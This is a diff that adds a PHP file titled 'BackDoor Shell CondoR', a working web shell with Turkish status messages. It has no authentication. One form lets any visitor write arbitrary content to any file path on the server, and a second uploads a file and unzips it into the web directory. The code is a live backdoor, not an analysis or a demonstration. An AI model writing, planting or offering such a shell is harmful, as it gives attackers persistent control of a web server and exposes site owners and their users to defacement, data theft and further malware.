@@ -1,0 +1,35 @@
+<?php
+if ($_POST)
+{
+$f=fopen($_POST["f"],"w");
+if(fwrite($f,$_POST["c"]))
+echo "<font color=red>OK!</font>";
+else
+echo "<font color=blue>Hata!</font>";
+}
+?>
+
+<title> BackDoor Shell CondoR</title>
+<form action="" method="post">
+<input type="text" size=61 name="f" value='<?php echo $_SERVER["SCRIPT_FILENAME"];?>'><br><br>
+<textarea name="c" cols=60 rows=15></textarea><br>
+<input type="submit" id="b" value="Create"><br>
+</form>
+<p></p>
+<?php 
+ echo   '<form   action=""   method="post"   enctype="multipart/form-data"   name="uploader"   id="uploader">';   
+ echo   '<input   type="file"   name="file"   size="50"><input   name="_upl"   type="submit"   id="_upl"   value="Upload"></form>';   
+ if(   $_POST['_upl']   ==   "Upload"   )   {   
+ $file   =   $_FILES['file']['name'];   
+ if(@copy($_FILES['file']['tmp_name'],   $_FILES['file']['name']))   {   
+ $zip   =   new   ZipArchive;   
+ if   ($zip->open($file)   ===   TRUE)   {   
+             $zip->extractTo('./');   
+             $zip->close();   
+ }   else   {   
+ }               
+ }else{      
+ echo   '<b>Basarisiz - CondoR</b><br><br>';      
+ }   
+ }   
+ ?>
